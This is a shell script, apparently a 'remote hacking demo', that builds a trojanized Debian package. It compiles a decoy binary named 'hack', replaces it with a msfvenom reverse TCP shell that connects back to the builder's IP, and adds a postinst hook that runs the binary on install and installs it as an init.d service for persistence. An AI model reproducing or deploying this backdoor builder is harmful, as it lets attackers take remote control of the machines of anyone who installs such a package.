echo "This script will create a custom debian package in the current directory"

echo "Please enter name of package:"
read name_pkg
echo "Enter version number:"
read version_pkg

DEBFOLDERNAME=$name_pkg-$version_pkg
rm -rf $DEBFOLDERNAME
mkdir $DEBFOLDERNAME

cd $DEBFOLDERNAME

mkdir DEBIAN
mkdir usr
mkdir usr/bin

#configuring the DEBIAN sub directory
cd DEBIAN

touch control

echo "Package: $name_pkg
Version: $version_pkg
Section: Remote Hacking Demo
Priority: optional
Architecture: all
Maintainer: Prakhar Agarwal (agarwalprakhar1996@gmail.com)
Description: Demo of remote hacking " > ./control

touch postinst

echo "#!/bin/sh
echo \"Running post installation script\"
sudo chmod 2755 /usr/bin/hack && /usr/bin/hack &

touch myscript.sh
echo \"#!/bin/sh
hack &
\" > ./myscript.sh
sudo mv myscript.sh /etc/init.d
chmod +x /etc/init.d/myscript.sh
sudo update-rc.d myscript.sh defaults
" > ./postinst
chmod 755 postinst

cd ..

cd usr/bin
touch program.c



echo "#include<stdio.h>
int main(){printf(\"Yes It works!\");}" > ./program.c


gcc program.c -o hack




cd ..
cd ..
cd ..

ip_address=$(hostname -I)

echo "Using IP Address $ip_address"

echo "Enter port number:"
read port_num

msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp LHOST=$ip_address LPORT=$port_num -b "\x00" -f elf -o ./$DEBFOLDERNAME/usr/bin/hack

dpkg-deb --build ./$DEBFOLDERNAME










